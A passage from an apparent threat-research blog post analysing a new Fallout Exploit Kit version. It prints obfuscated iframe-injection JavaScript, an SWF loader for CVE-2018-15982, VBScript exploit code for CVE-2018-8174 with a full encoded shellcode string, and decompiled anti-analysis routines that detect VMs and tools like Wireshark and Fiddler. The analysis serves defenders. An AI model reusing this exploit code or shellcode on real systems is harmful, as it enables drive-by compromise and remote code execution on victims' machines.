	<span class="kd">var</span> <span class="nx">IIlIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">IIlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">);</span>
	<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">IIlIl</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">I11I11IIlIII</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">IlIII1lll</span><span class="p">);</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">lIl1l1I</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">l1III11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">l1III11</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">l1III11</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">llIll1lI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIl1l1I</span><span class="p">);</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>For swf loader, the following code is executed.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"BnjJbx"</span><span class="nt">&gt;&lt;object</span> <span class="na">classid=</span><span class="s">"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"</span> <span class="na">width=</span><span class="s">"205"</span> <span class="na">height=</span><span class="s">"528"</span> <span class="na">id=</span><span class="s">"BnjJbx"</span> <span class="na">align=</span><span class="s">"middle"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"/24_02_1964/05_04_1933/3410-Skegger-12666"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"quality"</span> <span class="na">value=</span><span class="s">"high"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bgcolor"</span> <span class="na">value=</span><span class="s">"#ffffff"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"play"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"loop"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"wmode"</span> <span class="na">value=</span><span class="s">"window"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"scale"</span> <span class="na">value=</span><span class="s">"showall"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"menu"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"devicefont"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"salign"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"allowScriptAccess"</span> <span class="na">value=</span><span class="s">"sameDomain"</span> <span class="nt">/&gt;&lt;/object&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Thus, the swf file that exploits CVE-2018-15982 is read and executed.</p>

<h2 id="cve-2018-8174">CVE-2018-8174</h2>
<p>The exploit code used is very similar to PoC.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">StartExploit</span>
	<span class="n">UAF</span>
	<span class="n">InitObjects</span>
	<span class="n">vb_adrr</span><span class="o">=</span><span class="n">LeakVBAddr</span><span class="p">()</span>
	<span class="n">vbs_base</span><span class="o">=</span><span class="n">GetBaseByDOSmodeSearch</span><span class="p">(</span><span class="n">GetUint32</span><span class="p">(</span><span class="n">vb_adrr</span><span class="p">))</span>
	<span class="n">msv_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">vbs_base</span><span class="p">,</span><span class="s">"msvcrt.dll"</span><span class="p">)</span>
	<span class="n">krb_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"kernelbase.dll"</span><span class="p">)</span>
	<span class="n">ntd_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"ntdll.dll"</span><span class="p">)</span>
	<span class="n">VirtualProtectAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">krb_base</span><span class="p">,</span><span class="s">"VirtualProtect"</span><span class="p">)</span>
	<span class="n">NtContinueAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">ntd_base</span><span class="p">,</span><span class="s">"NtContinue"</span><span class="p">)</span>
	<span class="n">SetMemValue</span> <span class="n">GetShellcode</span><span class="p">()</span>
	<span class="n">ShellcodeAddr</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">8</span>
	<span class="n">SetMemValue</span> <span class="n">WrapShellcodeWithNtContinueContext</span><span class="p">(</span><span class="n">ShellcodeAddr</span><span class="p">)</span>
	<span class="n">lIlll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">69596</span>
	<span class="n">SetMemValue</span> <span class="n">ExpandWithVirtualProtect</span><span class="p">(</span><span class="n">lIlll</span><span class="p">)</span>
	<span class="n">llIIll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span>
	<span class="n">ExecuteShellcode</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="n">StartExploit</span>
</code></pre></div></div>

<p>The process to generate shellcode is like this.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Function</span> <span class="nf">GetShellcode</span><span class="p">()</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u0000%u0000%u0000%u0000"</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u8B55%u83EC%uF8E4%uEC81%u00CC%u0000%u5653%uE857%u08B0%u0000%uF08B%u44C7%u1824%u05CD%u5379%u848D%uB024%u0000%u8900%u2474%u8934%u2444%u8D14%u2454%u8D10%u2444%uC744%u2444%u1D1C%u2BDE%u8982%u2444%u8D10%u244C%u8D14%u2484%u0094%u0000%u4489%u2824%u448D%u1824%u8D50%u2444%u502C%u1EE8%u0006%u8B00%u245C%u8D18%u244C%u8B18%u247C%u8B1C%u8903%u2444%u8B40%u1C47%u4489%u4424%u478B%u8920%u2444%u3348%u89C0%u2444%u8918%u2444%u891C%u2444%uE834%u02E9%u0000%u548D%u1C24%uCF8B%u66E8%u0002%u8300%u2464%u0038%u4C8D%u2024%u406A%uE856%u02FE%u0000%uC683%u8D40%u244C%u6828%u0080%u0000%uE856%u02EC%u0000%u74FF%u2C24%u4C8B%u5024%u448D%u4824%u74FF%u2C24%uD68B%u74FF%u4824%u5753%u8D50%u2444%u5060%u448D%u4C24%uE850%u0389%u0000%uDB33%uC483%u3938%u245C%u742C%u8B41%u2474%u8D38%u2444%u6A48%u5F44%u5357%uFF50%u83D6%u0CC4%u7C89%u4824%u448D%u1824%u106A%u5053%uD6FF%uC483%u8D0C%u2444%u5018%u448D%u4C24%u5350%u6853%u0000%u0800%u5353%uFF53%u2474%u5350%u54FF%u6424%uFF53%u2454%u5F44%u5B5E%uE58B%uC35D%u8B55%u83EC%u0CEC%u458B%u890C%uF445%u458B%u8908%uF845%u6583%u00FC%u07EB%u458B%u40FC%u4589%u8BFC%uFC45%u453B%u7310%u8B12%uF845%u4503%u8BFC%uF44D%u4D03%u8AFC%u8809%uEB08%uC9DF%u55C3%uEC8B%u458B%u0F08%u00BE%uC085%u2D74%u458B%u0F08%u00BE%uF883%u7C41%u8B19%u0845%uBE0F%u8300%u5AF8%u0E7F%u458B%u0F08%u00BE%uC083%u8B20%u084D%u0188%u458B%u4008%u4589%uEB08%u5DC9%u55C3%uEC8B%u8B51%u0845%u4589%uEBFC%u8B07%uFC45%u8940%uFC45%u458B%u0FFC%u00BE%uC085%u0274%uEDEB%u458B%u2BFC%u0845%uC3C9%u5653%u8B57%u33D9%u53FF%u3347%uE8F6%uFFC9%uFFFF%u8B59%u85C8%u74C9%u0F24%u03B6%uD233%uC703%uF1BF%u00FF%uF700%u43F7%uFA8B%uD233%u048D%uBE3E%uFFF1%u0000%uF6F7%uF28B%uE983%u7501%uC1DC%u10E6%u048D%u5F37%u5B5E%u55C3%uEC8B%uEC83%u5310%u5756%uF98B%u5589%u33FC%u8BF6%u3C47%u5C8B%u7838%uDF03%u438B%u8B1C%u204B%uC703%u4589%u03F0%u8BCF%u2443%uC703%u4D89%u89F8%uF445%u7339%u7618%u8B18%uB10C%uCF03%u7BE8%uFFFF%u3BFF%uFC45%u1074%u4D8B%u46F8%u733B%u7218%u33E8%u5FC0%u5B5E%uC3C9%u458B%u8BF4%uF04D%uB70F%u7004%u048B%u0381%uEBC7%u64EA%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u8B00%u1040%u64C3%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u1040%u56C3%u8B57%u8BF9%u56F2%u078B%uD0FF%uC085%u0675%u478B%u5604%uD0FF%u5E5F%u56C3%uF18B%uE856%uFEAB%uFFFF%u8B59%uE8CE%uFF06%uFFFF%u3D5E%u06DE%u3F54%u1F74%u413D%uCD05%u7425%u3D18%u0309%u0F05%u1174%uEC3D%u1803%u7416%u3D0A%u044B%u19F3%u0374%uC033%u33C3%u40C0%u55C3%uEC8B%uEC81%u013C%u0000%u418B%u5308%u5756%uFA8B%uDB33%u518B%u890C%uF855%u518B%u8B10%u1449%u6A53%u8902%uFC55%u4D89%uFFF4%u8BD0%u83F0%uFFFE%u4074%u858D%uFEC8%uFFFF%u85C7%uFEC8%uFFFF%u0128%u0000%u5650%u55FF%u85F8%u74C0%u8D27%uEC8D%uFFFE%uE8FF%uFF6F%uFFFF%uC085%u1575%u858D%uFEC8%uFFFF%u5650%u55FF%u85FC%u75C0%u56E2%u55FF%uEBF4%u3303%u43DB%u1F89%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u5756%uC033%uF98B%u3340%u53C9%uA20F%uF38B%u8D5B%uF05D%u0389%u7389%u8904%u084B%u5389%u8B0C%uF845%uE8C1%u891F%u5F07%u5B5E%uC3C9%u8B55%u81EC%u04EC%u0001%u5300%u3356%u57F6%uC68B%u8488%uFC05%uFFFE%u40FF%u003D%u0001%u7200%u8BF1%u8BDE%u8BFE%u8AF1%u3D94%uFEFC%uFFFF%uC78B%uE083%u0F07%uCAB6%uB60F%u3004%uC303%uC803%uB60F%u8AD9%u1D84%uFEFC%uFFFF%u8488%uFC3D%uFFFE%u47FF%u9488%uFC1D%uFFFE%u81FF%u00FF%u0001%u7200%u8BC8%u0C7D%uF633%uDE8B%uFF85%u5574%u458B%u8908%u0C45%u438D%u0F01%uD8B6%u948A%uFC1D%uFFFE%u0FFF%uC2B6%uC603%uB60F%u8AF0%u3584%uFEFC%uFFFF%u8488%uFC1D%uFFFE%u88FF%u3594%uFEFC%uFFFF%uB60F%u1D8C%uFEFC%uFFFF%uB60F%u03C2%u8BC8%u0C45%uB60F%u8AC9%u0D8C%uFEFC%uFFFF%u0830%u8940%u0C45%uEF83%u7501%u8BB1%u0845%u5E5F%uC95B%u55C3%uEC8B%uEC83%u8B48%u1C45%u4D89%u53F4%u8B56%u8B08%u0870%u4D89%u8BF8%u0448%u4D89%u8BF0%u0C48%u4D89%u8BE8%u1048%u4D89%u8BE0%u1448%u4D89%u8BD8%u1848%u458B%u5714%u046A%u5589%u8BEC%u1850%u4D89%u8BC8%u2448%u458B%u6818%u1000%u0000%u046A%u006A%u388B%u5589%u89D4%uFC4D%u7D89%uFFD0%u6AD2%u8B04%u6AD8%u5300%u5D89%uFFE4%u83D7%u207D%u8D00%u1445%u046A%u5350%u1875%u7D83%u0024%u0975%u45C7%uC614%u90EA%uEB2A%uC71D%u1445%uF9D7%u2A90%u14EB%u7D83%u0024%u45C7%uD214%u90EB%u752A%uC707%u1445%uE4D2%u2A90%u29E8%uFFFC%u8BFF%u084D%u458D%u83C0%u0CC4%u45C7%uF4C0%uDBBC%uC770%uC445%uE14D%u1989%u086A%uE850%uFE76%uFFFF%u5959%uDB33%u458D%u53C0%u5353%u5053%u55FF%u8BF8%u85F8%u75FF%u8B0A%u1045%u1889%u23E9%u0001%u5300%u6A53%u5303%u6853%u01BB%u0000%u75FF%u57F4%u55FF%u8BF0%u89D8%u145D%uDB85%u840F%u00FB%u0000%u4D8B%u8D08%uB845%u086A%uC750%uB845%uC6E5%u1DB0%u45C7%u7CBC%uB9D1%uE819%uFE1C%uFFFF%u5959%uC033%u6850%u3000%u8080%u5050%uFF50%uEC75%u458D%u50B8%uFF53%uE855%uD88B%uDB85%u840F%u00B8%u0000%u046A%u75FF%u6AE4%u6A00%u5300%u55FF%u85E0%u0FC0%uA084%u0000%u8300%u1C65%u8D00%uDC45%u6583%u00DC%u8D50%u1845%u45C7%u0418%u0000%u5000%u458D%u501C%u0568%u0000%u5320%u55FF%u83D8%u187D%u7400%u8376%u1C7D%u7400%u6A70%u6804%u1000%u0000%u75FF%u6A1C%uFF00%uD455%u75FF%u8B1C%u0C4D%u006A%u8950%uFF01%uD055%u6583%u00CC%u458D%u50CC%u458B%uFF0C%u1C75%u30FF%uFF53%uC855%uFF53%uFFD6%u1475%uD6FF%uFF57%u83D6%u207D%u8B00%uFC75%u0474%u006A%uD6FF%u7D83%u0024%u0474%u006A%uD6FF%u458B%uFF0C%u1C75%u4D8B%uFF08%uE830%uFD52%uFFFF%u458B%u5910%uC759%u0100%u0000%uEB00%u5311%uD6FF%u75FF%uFF14%u57D6%uD6FF%u458B%u8310%u0020%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u8B56%u8BF1%u57DA%u7589%uE8FC%uFBF7%uFFFF%uF88B%u43BA%u1C04%u8B19%uE8CF%uFB83%uFFFF%u368B%u75BA%uB905%u8B28%u89CF%u1446%u72E8%uFFFB%u8BFF%uFC75%u51BA%u3209%u8B73%u890E%u1C41%uCF8B%u5EE8%uFFFB%u8BFF%uBA0E%u0614%u33F5%u4189%u8B08%uE8CF%uFB4D%uFFFF%u0E8B%u97BA%u8104%u891D%u8B01%uE8CF%uFB3D%uFFFF%u0E8B%u4DBA%u8505%u8927%u0441%uCF8B%u2CE8%uFFFB%u8BFF%uBA0E%u04E4%u2259%u4189%u8B0C%uE8CF%uFB1B%uFFFF%u0E8B%uD3BA%u7004%u891F%u1041%uCF8B%u0AE8%uFFFB%u8BFF%uBA0E%u047A%u1A1E%u4189%u8B18%uE8CF%uFAF9%uFFFF%u0E8B%uF3BA%u8503%u8915%u2041%uCF8B%uE8E8%uFFFA%u8BFF%u890E%u2441%u58E8%uFFFB%uBAFF%u028C%u08D8%uC88B%uD2E8%uFFFA%u8BFF%u6A0B%u890C%u8D01%uF045%u4D8B%u500C%u45C7%uC2F0%u8DE0%uC720%uF445%uB412%u37CD%u45C7%uEFF8%uF16B%uE8A4%uFC34%uFFFF%u5959%u0E8B%u558D%uE8F0%uFB2B%uFFFF%uF88B%u5DBA%u1006%u8B36%uE8CF%uFA91%uFFFF%u758B%uBA08%u0584%u29FB%u0E8B%u4189%u8B0C%uE8CF%uFA7D%uFFFF%u0E8B%u55BA%uC706%u8935%u1441%uCF8B%u6CE8%uFFFA%u8BFF%uBA0E%u078C%u4B92%u4189%u8B10%uE8CF%uFA5B%uFFFF%u0E8B%u55BA%u6406%u8936%u0841%uCF8B%u4AE8%uFFFA%u8BFF%uBA0E%u051D%u245C%u4189%u8B04%uE8CF%uFA39%uFFFF%u0E8B%u46BA%uC006%u8935%u8B01%uE8CF%uFA29%uFFFF%u0E8B%u5E5F%u895B%u1841%uC3C9%uECD7%u2182%uA319%u2DD6%u29FE%uCBFE%u5CE9%uB27D%u501A%uCF26%u6A47%u54FE%uDABA%u8A85%uEF83%u3361%u09D1%u20F7%u16EC%uD9B7%u917A%uDE1A%u2281%uEA7F%u3143%u6ACE%u1A52%u4FF4%u500B%uC276%u5A57%uC1F8%uE09A%u258F%uA209%u6BCD%u28EE%uE3E7%u2FD5%u8D28%u3568%uAE4A%u0623%u309B%u8E87%uE4E0%u8EF7%u5F02%u7AB4%u73DA%u7483%uB0D2%uBC0E%uB049%u40EE%u8610%u7665%u07AF%u7330%u3C80%u6436%uF745%u5A61%uC1F8%uBBE2%u5581%uF71D%u00A7%u7F8D%u4907%u11AF%uB565%uF4E6%u755E%u19EE%u23AF%u8DB6%uEB89%u2838%u11BF%uC109%u1219%uD17E%uBEEA%uDD49%uF759%u09D6%uEA08%u8E45%uB602%u1B93%u19C4%u9146%uB94D%u9E6C%u0BC7%u00E8%u0000%u5800%uE883%u2D05%u00C0%u0000%u00C3"</span> <span class="o">&amp;</span><span class="n">lIIII</span><span class="p">(</span><span class="n">IIIII</span><span class="p">(</span><span class="s">""</span><span class="p">)))</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">IIlI</span> <span class="o">&amp;</span> <span class="kt">String</span><span class="p">((</span><span class="o">&amp;</span><span class="n">h80000</span><span class="o">-</span><span class="n">LenB</span><span class="p">(</span><span class="n">IIlI</span><span class="p">))</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u4141"</span><span class="p">))</span>
	<span class="n">GetShellcode</span><span class="o">=</span><span class="n">IIlI</span>
<span class="k">End</span> <span class="k">Function</span>
</code></pre></div></div>

<p>Let’s read shellcode.</p>

<h2 id="shellcode">Shellcode</h2>
<p>The decoding algorithm in the shellcode has not changed from v3 and remains RC4.
<a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></p>

<p>The hash algorithm of API hash has not changed either.
API hashed by the dualaccModFFF1Hash algorithm.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">dualaccModFFF1Hash</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// esi</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">zz_count</span><span class="p">(</span><span class="n">this</span><span class="p">);</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">v1</span><span class="o">++</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">v5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However, there were interesting changes.
Analysis environment detection codes has been added in shellcode.</p>

<h3 id="vm-detection">VM Detection</h3>

<p>Query hypervisor precense using CPUID.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">zz_vm_detect</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">_EAX</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">cpuid</span> <span class="p">}</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="process-detection">Process Detection</h3>
<p>Get a list of running processes.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/03.jpg" /></p>

<p>Convert process name to lower case.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">zz_tolowercase</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">a1</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&lt;=</span> <span class="mi">90</span> <span class="p">)</span>
      <span class="o">*</span><span class="n">a1</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
    <span class="o">++</span><span class="n">a1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Compare to the following hashes.
Once again, It uses the dualaccModFFF1Hash algorithm.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x3F5406DE
0x25CD0541
0x0F050309
0x161803EC
0x19F3044B
</code></pre></div></div>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/04.jpg" /></p>

<p>Two process names were identified. I do not know the others.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"wireshark.exe"</span><span class="p">))</span>
<span class="s">'0x25cd0541'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"fiddler.exe"</span><span class="p">))</span>
<span class="s">'0x19f3044b'</span>
</code></pre></div></div>

<p>Like v3, shellcode downloads, decodes and executes encrypted PowerShell code.</p>

<h2 id="powershell">PowerShell</h2>
<p>The PowerShell code to be executed is like this.</p>

